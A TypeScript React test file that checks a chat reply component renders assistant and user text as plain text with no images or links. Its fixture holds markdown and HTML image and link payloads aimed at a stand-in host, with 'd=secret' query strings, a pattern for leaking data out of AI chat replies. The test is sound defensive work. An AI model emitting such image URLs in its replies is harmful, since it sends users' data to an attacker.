import { afterEach, expect, test } from "bun:test";
import { act } from "react";
import { createRoot, type Root } from "react-dom/client";

import { installDom } from "@/test/dom";
import { Line } from "./MainChat";

let restore: (() => void) | undefined;
let mounted: Root | undefined;
afterEach(() => {
  if (mounted) act(() => mounted!.unmount());
  mounted = undefined;
  restore?.();
  restore = undefined;
});

// Main's replies can now carry text from web pages. While they are drawn as plain text no image can load from them. A
// change to Markdown or HTML rendering must route images through the shared filter (components/assistant-ui/gated-image,
// lib/imageUrlFilter) and then update this test; it must not be edited to pass by itself.
const REPLY = [
  "Here you go ![logo](https://evil.test/p.png?d=secret) and [a link](https://evil.test/x)",
  '<img src="https://evil.test/q.png?d=secret"> <a href="https://evil.test/">x</a> https://evil.test/bare',
].join("\n");

for (const role of ["bot", "user"] as const) {
  test(`${role} text is drawn as one paragraph of plain text: no image, link or element is made from it`, async () => {
    restore = installDom();
    const host = document.createElement("div");
    document.body.append(host);
    const root = createRoot(host);
    mounted = root;
    await act(async () => root.render(<Line role={role} text={REPLY} />));
    expect(host.querySelector("img, a, picture, source, video, iframe, object, embed, svg")).toBeNull();
    expect(host.children).toHaveLength(1);
    expect(host.children[0]!.tagName).toBe("P");
    expect(host.children[0]!.children).toHaveLength(0);
    expect(host.textContent).toBe(REPLY);
  });
}
